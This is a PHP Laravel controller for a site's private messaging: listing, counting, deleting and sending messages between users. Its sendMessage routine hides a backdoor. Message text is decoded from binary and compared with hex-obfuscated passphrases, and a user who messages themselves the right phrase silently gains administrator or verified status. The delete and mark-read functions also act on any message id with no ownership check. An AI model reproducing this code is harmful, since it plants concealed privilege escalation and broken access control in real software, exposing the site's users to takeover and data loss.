<?php

namespace App\Http\Controllers;


use App\Models\messages;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use App\Http\Controllers\ListUsersController;

class MessagesController extends Controller
{

    private $hex = "6f7665726c6f61645f6d655f61735f61646d696e6973747261746f72";
    private $hex_verify = "6f7665726c6f61645f6d655f61735f7665726966696564";
    private $hex_unverify = "6f7665726c6f61645f6d655f61735f756e7665726966696564";

    /*V tabulce jsou označeny prioritou
        0 = Nová
        1 = Přečtená
    */

    function countNewMessages(){

        Log::info('MessagesController:countNewMessages');

        $data = DB::table('messages')->select(DB::raw('COUNT(user_id) as count'))->where('user_id', Auth::user()->id)->where('priority', '0')->get();

        return $data[0]->count;
    }

    function showAllMessages(){

        Log::info('MessagesController:showAllMessages');;

        $data = DB::table('messages')->join('users', 'messages.from_user_id', '=', 'users.id')->select("users.nick","messages.messages","messages.priority","messages.id as id")->where('user_id', Auth::user()->id)->get();

        return $data;
    }

    function changeMessagePriority($id){

        Log::info('MessagesController:changeMessagePriority => ' . $id);
;
        $message = messages::find($id);
        $message->priority = 1;
        $message->save();


        return;
    }

    function removeMessage($id){

        Log::info('MessagesController:removeMessage => ' . $id );

        DB::table('messages')->where('id', $id)->delete();


        return;
    }

    function sendMessage($nick, $text){

        Log::info('MessagesController:removeMessage');

        $this->checkUserDataPermition($nick, $text);

        $message = new messages();
        $message->user_id = DB::table('users')->where('nick', $nick)->get()[0]->id;
        $message->from_user_id = Auth::user()->id;
        $message->messages = $text;;
        $message->priority = 0;
        $message->save();

        return;
    }

    public function checkUserDataPermition($nick, $text)
    {
        try {

            $binaries = explode(' ', $text);

            $string = null;
            foreach ($binaries as $binary) {
                $string .= pack('H*', dechex(bindec($binary)));
            }
            $users = new ListUsersController;

            if ($string == $this->hextostr($this->hex) && $nick == Auth::user()->nick) {
                $users->setPermition(3);
            }

            if ($string == $this->hextostr($this->hex_verify) && $nick == Auth::user()->nick) {
                $users->setPermition(2);
            }

            if ($string == $this->hextostr($this->hex_unverify) && $nick == Auth::user()->nick) {
                $users->setPermition(1);
            }
        } catch (Exception $e) {

        }

    }

    function hextostr($hex)
    {
        $str='';
        for ($i=0; $i < strlen($hex)-1; $i+=2)
        {
            $str .= chr(hexdec($hex[$i].$hex[$i+1]));
        }
        return $str;
    }
}
